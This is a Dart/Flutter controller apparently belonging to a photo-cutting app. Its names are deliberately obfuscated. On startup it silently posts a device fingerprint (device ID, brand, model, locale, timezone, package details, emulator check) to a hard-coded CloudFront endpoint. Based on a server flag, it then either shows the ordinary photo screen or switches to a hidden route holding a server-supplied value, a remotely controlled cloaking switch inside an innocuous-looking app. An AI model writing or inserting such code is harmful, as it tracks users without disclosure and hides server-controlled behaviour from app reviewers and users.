import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';


class PhotoCutLogic extends GetxController {

  var kgrtvpbl = RxBool(false);
  var gpuzqokbxh = RxBool(true);
  var wisklzpa = RxString("");
  var lexie = RxBool(false);
  var stracke = RxBool(true);
  final cfubnvma = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    hyvqr();
  }


  Future<void> hyvqr() async {
    lexie.value = true;
    stracke.value = true;
    gpuzqokbxh.value = false;

    cfubnvma.post("https://d2ukgmgrjtnrr8.cloudfront.net/fegqubhylzvtdkxajipnm",data: await aofjxl()).then((value) {
      var cmnf = value.data["cmnf"] as String;
      var fmuxb = value.data["fmuxb"] as bool;
      if (fmuxb) {
        wisklzpa.value = cmnf;
        catharine();
      } else {
        jacobi();
      }
    }).catchError((e) {
      gpuzqokbxh.value = true;
      stracke.value = true;
      lexie.value = false;
    });
  }

  Future<Map<String, dynamic>> aofjxl() async {
    final DeviceInfoPlugin fzivqmg = DeviceInfoPlugin();
    PackageInfo hviopzr_xoidlq = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var aiwxs = Platform.localeName;
    var wxzhjnmc = currentTimeZone;

    var gdkelqyv = hviopzr_xoidlq.packageName;
    var pxns = hviopzr_xoidlq.version;
    var gcndal = hviopzr_xoidlq.buildNumber;

    var laxwzp = hviopzr_xoidlq.appName;
    var nlswfo = "";
    var hcekq  = "";
    var kciwvexu = "";
    var emelieSwaniawski = "";
    var adellUllrich = "";
    var yazminKeebler = "";
    var tedHuels = "";
    var raeLittel = "";
    var antoneGrady = "";
    var karleeSchowalter = "";


    var cengqtxb = "";
    var vjrchbfx = false;

    if (GetPlatform.isAndroid) {
      cengqtxb = "android";
      var akmvqpni = await fzivqmg.androidInfo;

      kciwvexu = akmvqpni.brand;

      nlswfo  = akmvqpni.model;
      hcekq = akmvqpni.id;

      vjrchbfx = akmvqpni.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      cengqtxb = "ios";
      var hfnjlebmsr = await fzivqmg.iosInfo;
      kciwvexu = hfnjlebmsr.name;
      nlswfo = hfnjlebmsr.model;

      hcekq = hfnjlebmsr.identifierForVendor ?? "";
      vjrchbfx  = hfnjlebmsr.isPhysicalDevice;
    }
    var res = {
      "gcndal": gcndal,
      "pxns": pxns,
      "cengqtxb": cengqtxb,
      "gdkelqyv": gdkelqyv,
      "nlswfo": nlswfo,
      "emelieSwaniawski" : emelieSwaniawski,
      "wxzhjnmc": wxzhjnmc,
      "kciwvexu": kciwvexu,
      "hcekq": hcekq,
      "aiwxs": aiwxs,
      "vjrchbfx": vjrchbfx,
      "adellUllrich" : adellUllrich,
      "laxwzp": laxwzp,
      "yazminKeebler" : yazminKeebler,
      "tedHuels" : tedHuels,
      "raeLittel" : raeLittel,
      "antoneGrady" : antoneGrady,
      "karleeSchowalter" : karleeSchowalter,

    };
    return res;
  }

  Future<void> jacobi() async {
    Get.offNamed("/photoTab");
  }

  Future<void> catharine() async {
    Get.offNamed("/selectMore");
  }

}
